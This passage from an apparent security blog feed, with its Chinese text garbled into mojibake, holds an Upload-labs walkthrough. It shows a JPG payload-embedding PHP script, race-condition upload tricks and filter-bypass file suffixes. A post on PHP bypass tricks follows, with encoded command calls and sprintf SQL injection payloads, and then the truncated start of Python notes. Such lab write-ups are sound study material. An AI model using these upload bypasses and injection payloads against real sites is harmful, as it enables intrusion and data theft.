class="token variable">$extraBytes</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">int</span><span class="token punctuation">)</span><span class="token variable">$m</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">DataInputStream</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">private</span> <span class="token variable">$binData</span><span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token variable">$order</span><span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token variable">$size</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$order</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">,</span> <span class="token variable">$fromString</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">order</span> <span class="token operator">=</span> <span class="token variable">$order</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$fromString</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'File not exists ['</span><span class="token operator">.</span><span class="token variable">$filename</span><span class="token operator">.</span><span class="token string single-quoted-string">']'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span> <span class="token operator">=</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">size</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">seek</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">size</span> <span class="token operator">-</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">skip</span><span class="token punctuation">(</span><span class="token variable">$skip</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span><span class="token punctuation">,</span> <span class="token variable">$skip</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">readByte</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token function">eof</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'End Of File'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token variable">$byte</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$byte</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">readShort</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'End Of File'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token variable">$short</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">order</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$short</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$short</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$short</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$short</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$short</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$short</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">return</span> <span class="token variable">$short</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">eof</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token class-name">binData</span><span class="token operator">||</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>ç„¶åæ‰§è¡Œå‘½ä»¤<code>php jpg_payload.php 1.jpg</code></p><p>æ˜¾ç¤º<code>Success!</code>å³æˆåŠŸï¼Œè£…æ¢åçš„æ–‡ä»¶åä¸º<code>payload_1.jpg</code></p><p>å°†<code>payload_1.jpg</code>ä¸Šä¼ ï¼Œphpä»£ç æˆåŠŸè¢«è§£æ</p><h3 id="Pass-17"><a href="#Pass-17" class="headerlink" title="Pass-17"></a>Pass-17</h3><p>æ¡ä»¶ç«äº‰ï¼Œåˆ©ç”¨burpçš„intruderæ¨¡å—ï¼Œä¸åœçš„å‘é€æ•°æ®åŒ…ï¼Œå°±å¯ä»¥è¿æ¥ä¸Šï¼Œæˆ‘ç¡¬æ˜¯å¼€äº†3ä¸ªintruderæ¨¡å—æ‰è®¿é—®çš„åˆ°ç½‘é¡µ</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Upload-labs%E9%9D%B6%E5%9C%BA/image-20200209211644172.png" alt loading="lazy"></p><h3 id="Pass-18"><a href="#Pass-18" class="headerlink" title="Pass-18"></a>Pass-18</h3><p>åŒæ ·æ¡ä»¶ç«äº‰ï¼Œè®©å‘åŒ…çš„é€Ÿåº¦å¿«è¿‡å‡½æ•°rename()çš„é€Ÿåº¦å³å¯æˆåŠŸä¸Šä¼ </p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Upload-labs%E9%9D%B6%E5%9C%BA/image-20200209212552816.png" alt loading="lazy"></p><h3 id="Pass-19"><a href="#Pass-19" class="headerlink" title="Pass-19"></a>Pass-19</h3><p>ä¿å­˜åç§°é‚£é‡Œåœ¨åç¼€ï¼ŒååŠ ä¸Šä¸€ä¸ª<code>/.</code> ã€<code>.(ç©ºæ ¼)</code>æˆ–<code>.</code>ï¼›<code>move_uploaded_file()</code>è¿˜æœ‰ä¸€ä¸ªç‰¹æ€§ï¼Œä¼šå¿½ç•¥æ‰æ–‡ä»¶æœ«å°¾çš„<code>.</code></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Upload-labs%E9%9D%B6%E5%9C%BA/image-20200209213807846.png" alt loading="lazy"></p>]]></content>
      
      
      
        <tags>
            
            <tag> uploads </tag>
            
            <tag> é¶åœº </tag>
            
            <tag> æ–‡ä»¶ä¸Šä¼  </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä¸€äº›PHPå‡½æ•°</title>
      <link href="posts/4eec4e89/"/>
      <url>posts/4eec4e89/</url>
      
        <content type="html"><![CDATA[<h2 id="ç»•è¿‡å‡½æ•°"><a href="#ç»•è¿‡å‡½æ•°" class="headerlink" title="ç»•è¿‡å‡½æ•°"></a>ç»•è¿‡å‡½æ•°</h2><h3 id="base-convert"><a href="#base-convert" class="headerlink" title="base_convert"></a>base_convert</h3><img src="https://gitee.com/Extrader/blogimage/raw/master/image/ä¸€äº›PHPå‡½æ•°/image-20200206145300281.png" style="zoom:67%;" loading="lazy"><p>å¯ç”¨ä»¥ç»•è¿‡æ‰§è¡Œä¸€äº›ç³»ç»Ÿå‘½ä»¤</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">base_convert</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'phpinfo'</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token operator">==</span><span class="token operator">></span> <span class="token number">55490343972</span></code></pre><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">base_convert</span><span class="token punctuation">(</span><span class="token number">55490343972</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span><span class="token operator">></span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h3 id="hex2bin"><a href="#hex2bin" class="headerlink" title="hex2bin"></a>hex2bin</h3><img src="https://gitee.com/Extrader/blogimage/raw/master/image/ä¸€äº›PHPå‡½æ•°/image-20200206150504686.png" style="zoom:67%;" loading="lazy"><h3 id="dechex"><a href="#dechex" class="headerlink" title="dechex"></a>dechex</h3><img src="https://gitee.com/Extrader/blogimage/raw/master/image/ä¸€äº›PHPå‡½æ•°/image-20200206150752364.png" style="zoom:67%;" loading="lazy"><h3 id="hexdec"><a href="#hexdec" class="headerlink" title="hexdec"></a>hexdec</h3><img src="https://gitee.com/Extrader/blogimage/raw/master/image/ä¸€äº›PHPå‡½æ•°/image-20200206151951567.png" style="zoom:67%;" loading="lazy"><p>ä¾‹ï¼šcat *çš„16è¿›åˆ¶ä¸º636174202a</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">hexdec</span><span class="token punctuation">(</span><span class="token number">636174202</span>a<span class="token punctuation">)</span> <span class="token operator">==</span><span class="token operator">></span> <span class="token number">426836762666</span></code></pre><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token number">426836762666</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span><span class="token operator">></span> cat <span class="token operator">*</span></code></pre><h2 id="è¯»å–æ•°æ®å‡½æ•°"><a href="#è¯»å–æ•°æ®å‡½æ•°" class="headerlink" title="è¯»å–æ•°æ®å‡½æ•°"></a>è¯»å–æ•°æ®å‡½æ•°</h2><h3 id="scandir"><a href="#scandir" class="headerlink" title="scandir"></a>scandir</h3><img src="https://gitee.com/Extrader/blogimage/raw/master/image/ä¸€äº›PHPå‡½æ•°/image-20200206153405574.png" style="zoom:67%;" loading="lazy"><h3 id="readfile"><a href="#readfile" class="headerlink" title="readfile"></a>readfile</h3><img src="https://gitee.com/Extrader/blogimage/raw/master/image/ä¸€äº›PHPå‡½æ•°/image-20200206153545427.png" style="zoom:67%;" loading="lazy"><h3 id="chr"><a href="#chr" class="headerlink" title="chr"></a>chr</h3><img src="https://gitee.com/Extrader/blogimage/raw/master/image/ä¸€äº›PHPå‡½æ•°/image-20200206154027139.png" style="zoom:67%;" loading="lazy"><h3 id="var-dump"><a href="#var-dump" class="headerlink" title="var_dump"></a>var_dump</h3><img src="https://gitee.com/Extrader/blogimage/raw/master/image/ä¸€äº›PHPå‡½æ•°/image-20200206154243939.png" style="zoom:67%;" loading="lazy"><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">47</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    è¯»å–å½“å‰ç›®å½•æ–‡ä»¶</code></pre><h3 id="show-source"><a href="#show-source" class="headerlink" title="show_source"></a>show_source</h3><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E4%B8%80%E4%BA%9BPHP%E5%87%BD%E6%95%B0/image-20200315185811823.png" alt loading="lazy"></p><p>å¯ç°æ˜¾ç¤ºphpä»£ç ï¼Œç”¨äº<code>data://</code>åè®®ä¸­æ¥è¯»å–ä»£ç </p><h2 id="æ¼æ´å‡½æ•°"><a href="#æ¼æ´å‡½æ•°" class="headerlink" title="æ¼æ´å‡½æ•°"></a>æ¼æ´å‡½æ•°</h2><h3 id="strcmp"><a href="#strcmp" class="headerlink" title="strcmp"></a>strcmp</h3><p><code>int strcmp(string $str1, string $str2)</code></p><p><code>str1</code>ä¸ºç¬¬ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œ<code>str2</code>ä¸ºç¬¬äºŒä¸ªå­—ç¬¦ä¸²ï¼Œå¦‚æœ<code>str1</code>å°äº<code>str2</code>è¿”å›<code>&lt;0</code>å¦‚æœ<code>str1</code>å¤§äº<code>str2</code>è¿”å›<code>&gt;0</code>ï¼›å¦‚æœäºŒè€…ç›¸ç­‰ï¼Œè¿”å›<code>0</code></p><p>ä½†æ˜¯å½“æˆ‘ä»¬ä¼ å…¥æ•°ç»„çš„æ—¶å€™ï¼Œå‡½æ•°æ¥æ”¶åˆ°ä¸åˆæ³•çš„å­—ç¬¦åä¼šæŠ¥é”™ï¼Œä½†æ˜¯åœ¨php5.3ä¹‹å‰çš„phpä¸­ï¼Œæ˜¾ç¤ºäº†æŠ¥é”™çš„è­¦å‘Šä¿¡æ¯åå°†<code>return 0</code>ï¼›æ„æ€æ˜¯å°±ç®—æŠ¥äº†é”™ï¼Œä½†åˆ¤å®šç»“æœè¿˜æ˜¯ç›¸ç­‰çš„ï¼Œå³å¯é€šè¿‡æ•°ç»„è¿›è¡Œç»•è¿‡</p><h3 id="is-numeric"><a href="#is-numeric" class="headerlink" title="is_numeric"></a>is_numeric</h3><p>å‡½æ•°æ£€æµ‹å˜é‡æ˜¯å¦ä¸ºæ•°å­—æˆ–æ•°å­—å­—ç¬¦ä¸²ï¼Œæ˜¯åˆ™è¿”å›<code>true</code>ï¼Œå¦åˆ™è¿”å›<code>false</code>ï¼Œä½†æ˜¯è¯¥å‡½æ•°å¯¹äºç©ºå­—ç¬¦ï¼ˆå¦‚ï¼š<code>%00</code>ï¼Œ<code>%20</code>ï¼‰åˆ™ä¼šç›´æ¥è·³è¿‡ç©ºå­—ç¬¦åˆ¤æ–­ï¼Œæ‰§è¡Œåé¢çš„è¯­å¥ï¼Œæ˜¯åˆ¤æ–­åˆ™ä¼šæ¥ç€ç»§ç»­åé¢çš„åˆ¤æ–­ï¼Œæ³¨ï¼š<code>%20</code>æ”¾åœ¨å­—ç¬¦ä¸²é¦–åˆ™æ— æ•ˆï¼Œä¾‹ï¼š</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E4%B8%80%E4%BA%9BPHP%E5%87%BD%E6%95%B0/image-20200229210728123.png" alt loading="lazy"></p><h3 id="sprintf"><a href="#sprintf" class="headerlink" title="sprintf()"></a>sprintf()</h3><p>å‚è€ƒï¼š<a href="http://bey0nd.xyz/2018/11/05/1/">http://bey0nd.xyz/2018/11/05/1/</a></p><pre class="language-none"><code class="language-none">sprintf(format,arg1,arg2,arg++)arg1ã€arg2ã€arg++ å‚æ•°å°†è¢«æ’å…¥åˆ°ä¸»å­—ç¬¦ä¸²ä¸­çš„ç™¾åˆ†å·ï¼ˆ%ï¼‰ç¬¦å·å¤„ã€‚è¯¥å‡½æ•°æ˜¯é€æ­¥æ‰§è¡Œçš„ã€‚åœ¨ç¬¬ä¸€ä¸ª % ç¬¦å·å¤„ï¼Œæ’å…¥ arg1ï¼Œåœ¨ç¬¬äºŒä¸ª % ç¬¦å·å¤„ï¼Œæ’å…¥ arg2ï¼Œä¾æ­¤ç±»æ¨ã€‚æ³¨é‡Šï¼šå¦‚æœ % ç¬¦å·å¤šäº arg å‚æ•°ï¼Œåˆ™æ‚¨å¿…é¡»ä½¿ç”¨å ä½ç¬¦ã€‚å ä½ç¬¦ä½äº % ç¬¦å·ä¹‹åï¼Œç”±æ•°å­—å’Œ &quot;\$&quot; ç»„æˆã€‚</code></pre><p><strong>åæ–œæ å•å¼•å·é€ƒé€¸</strong></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select * from user where username = '%\' and 1=1#';"</span> <span class="token punctuation">;</span><span class="token variable">$args</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"admin"</span> <span class="token punctuation">;</span><span class="token keyword">echo</span>  <span class="token function">sprintf</span> <span class="token punctuation">(</span> <span class="token variable">$sql</span> <span class="token punctuation">,</span> <span class="token variable">$args</span> <span class="token punctuation">)</span> <span class="token punctuation">;</span></span></code></pre><p>=&gt; <code>echo sprintf(&quot;select * from user where username = &#39;%\&#39; and 1=1#&#39;;&quot;, &quot;admin&quot;);</code><br>æ­¤æ—¶%\å›å»åŒ¹é…adminå­—ç¬¦ä¸²ï¼Œä½†æ˜¯<code>%\</code>åªä¼šåŒ¹é…ç©º<br>è¿è¡Œåçš„ç»“æœ<br><code>select * from user where username = &#39;&#39; and 1=1#&#39;</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$input</span> <span class="token operator">=</span> <span class="token function">addslashes</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"%1$' and 1=1#"</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">sprintf</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"AND b='%s'"</span><span class="token punctuation">,</span> <span class="token variable">$input</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token function">sprintf</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"SELECT * FROM t WHERE a='%s' <span class="token interpolation"><span class="token variable">$b</span></span> "</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'admin'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>å¯¹<code>$input</code>ä¸<code>$b</code>è¿›è¡Œäº†æ‹¼æ¥<br><code>$sql = sprintf (&quot;SELECT * FROM t WHERE a=&#39;%s&#39; AND b=&#39;%1$\&#39; and 1=1#&#39; &quot;, &#39;admin&#39; );</code><br>å¾ˆæ˜æ˜¾ï¼Œè¿™ä¸ªå¥å­é‡Œé¢çš„<code>\</code>æ˜¯ç”±<code>addsashes</code>ä¸ºäº†è½¬ä¹‰å•å¼•å·è€ŒåŠ ä¸Šçš„ï¼Œä½¿ç”¨<code>%s</code>ä¸<code>%1$\</code>ç±»åŒ¹é…<code>admin</code>ï¼Œé‚£ä¹ˆ<code>admin</code>åªä¼šå‡ºç°åœ¨<code>%s</code>é‡Œï¼Œ<code>%1$\</code>ä¸ºç©º<br><code>echo  $sql ;</code><br>è¿è¡Œåçš„ç»“æœ<br><code>SELECT * FROM t WHERE a=&#39;admin&#39; AND b=&#39;&#39; and 1=1#&#39;</code></p><p><strong>%cåˆ©ç”¨</strong></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?</span> <span class="token class-name type-declaration">php</span><span class="token variable">$input1</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'%1$c) OR 1 = 1 /*'</span> <span class="token punctuation">;</span><span class="token variable">$input2</span> <span class="token operator">=</span> <span class="token number">39</span> <span class="token punctuation">;</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM foo WHERE bar IN (' <span class="token interpolation"><span class="token variable">$input1</span></span> ') AND baz = %s"</span> <span class="token punctuation">;</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token function">sprintf</span> <span class="token punctuation">(</span> <span class="token variable">$sql</span> <span class="token punctuation">,</span> <span class="token variable">$input2</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span>  <span class="token variable">$sql</span> <span class="token punctuation">;</span></span></code></pre><p><code>%c</code>èµ·åˆ°äº†ç±»ä¼¼<code>chr()</code>çš„æ•ˆæœï¼Œå°†æ•°å­—39è½¬åŒ–ä¸º<code>&#39;</code>ï¼Œä»è€Œå¯¼è‡´äº†sqlæ³¨å…¥ã€‚</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> foo <span class="token keyword">WHERE</span> bar <span class="token operator">IN</span> <span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span> <span class="token operator">OR</span> <span class="token number">1</span> <span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">/</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">AND</span> baz <span class="token operator">=</span> <span class="token number">39</span></code></pre><h3 id="extract"><a href="#extract" class="headerlink" title="extract"></a>extract</h3><p><code>extract()</code> å‡½æ•°ä»æ•°ç»„ä¸­å°†å˜é‡å¯¼å…¥åˆ°å½“å‰çš„ç¬¦å·è¡¨ã€‚<a href="https://www.php.net/manual/zh/function.extract.php">å‚è€ƒ</a></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E4%B8%80%E4%BA%9BPHP%E5%87%BD%E6%95%B0/image-20200515140833843.png" alt loading="lazy"></p><p>å¦‚æœæœªè®¾ç½®<strong><code>EXTR_SKIP</code></strong>ï¼Œåˆ™ä¼šå¯¼è‡´å˜é‡è¦†ç›–ï¼Œ<a href="https://crayon-xin.github.io/2018/05/21/extract%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/">å‚è€ƒ</a></p><p>æ³¨ï¼šè¦†ç›–çš„æ˜¯åŸæ¥å·²ç»è®¾ç½®çš„æˆ–æ²¡è®¾ç½®çš„å€¼ï¼Œå¦‚æœåœ¨å‡½æ•°åé¢åˆé‡æ–°è®¾ç½®äº†è¿™ä¸ªå€¼ï¼Œåˆ™ä¼šå†è¦†ç›–å›å»ï¼Œå¯ä»¥å‚è€ƒæœ¬åšå®¢çš„<strong>ååºåˆ—åŒ–-å®‰æ´µæ¯-2019-easy_serialize_php</strong></p>]]></content>
      
      
      <categories>
          
          <category> å¤‡å¿˜å½• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pythonç¬”è®°</title>
      <link href="posts/c00b24b1/"/>
      <url>posts/c00b24b1/</url>
      
        <content type="html"><![CDATA[<h1 id="åŸºç¡€"><a href="#åŸºç¡€" class="headerlink" title="åŸºç¡€"></a>åŸºç¡€</h1><h2 id="è¿ç®—å‡½æ•°"><a href="#è¿ç®—å‡½æ•°" class="headerlink" title="è¿ç®—å‡½æ•°"></a>è¿ç®—å‡½æ•°</h2><table><thead><tr><th align="center">å‡½æ•°</th><th align="center">ä½œç”¨</th><th align="center">ä¾‹</th></tr></thead><tbody><tr><td align="center">abs(x)</td><td align="center">ç»å¯¹å€¼å‡½æ•°</td><td align="center">abs(-1) = 1</td></tr><tr><td align="center">divmod(x,y)</td><td align="center">å•†ä½™å‡½æ•°</td><td align="center">divmod(10,3) = (3,1)</td></tr><tr><td align="center">pow(x,y,z)</td><td align="center">å¹‚è¿ç®—å‡½æ•°</td><td align="center">pow(2,2) = 4,pow(2,2,3) = 1</td></tr><tr><td align="center">round(x)</td><td align="center">å››èˆäº”å…¥å‡½æ•°</td><td align="center">round(1.5) = 2</td></tr><tr><td align="center">max(x)</td><td align="center">æœ€å¤§å€¼å‡½æ•°</td><td align="center">max(1,2,3) = 3</td></tr><tr><td align="center">min(x)</td><td align="center">æœ€å°å€¼å‡½æ•°</td><td align="center">min(1,2,3) = 1</td></tr></tbody></table><h2 id="å­—ç¬¦ä¸²å¤„ç†å‡½æ•°"><a href="#å­—ç¬¦ä¸²å¤„ç†å‡½æ•°" class="headerlink" title="å­—ç¬¦ä¸²å¤„ç†å‡½æ•°"></a>å­—ç¬¦ä¸²å¤„ç†å‡½æ•°</h2><table><thead><tr><th align="center">å‡½æ•°</th><th align="center">æè¿°</th></tr></thead><tbody><tr><td align="center">len(x)</td><td align="center">è¿”å›å­—ç¬¦ä¸²xçš„é•¿åº¦ï¼Œlen(â€œå£¹1,\â€˜ aâ€) = 6</td></tr><tr><td align="center">str(x)</td><td align="center">ä»»æ„ç±»å‹xæ‰€å¯¹åº”çš„å­—ç¬¦ä¸²å½¢å¼,str(â€˜abc123â€™)=abc123,ä¸eval()å½¢æˆå¯¹æ¯”</td></tr><tr><td align="center">hex(x)æˆ–oct(x)</td><td align="center">æ•´æ•°xçš„åå…­è¿›åˆ¶æˆ–å…«è¿›åˆ¶å°å†™å½¢å¼çš„å­—ç¬¦ä¸²ï¼Œhex(111)=â€™0x6fâ€™,oct(111)=â€™0o157â€™</td></tr><tr><td align="center">chr(x)</td><td align="center">xä¸ºUnicodeç¼–ç ï¼Œè¿”å›å…¶å¯¹åº”çš„å­—ç¬¦ï¼Œchr(20197) = â€˜ä»¥â€™</td></tr><tr><td align="center">ord(x)</td><td align="center">xä¸ºå­—ç¬¦ï¼Œè¿”å›å…¶å¯¹åº”çš„Unicodeç¼–ç ï¼Œord(â€œä»¥â€) = 20197</td></tr></tbody></table><blockquote><p><strong>è¾“å…¥ä¸ºå°æ•°å­—ç¬¦ä¸²ï¼Œè½¬æ¢æˆintå‹æ–¹æ³•ï¼š<code>a = int(float(a))</code></strong></p></blockquote><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token 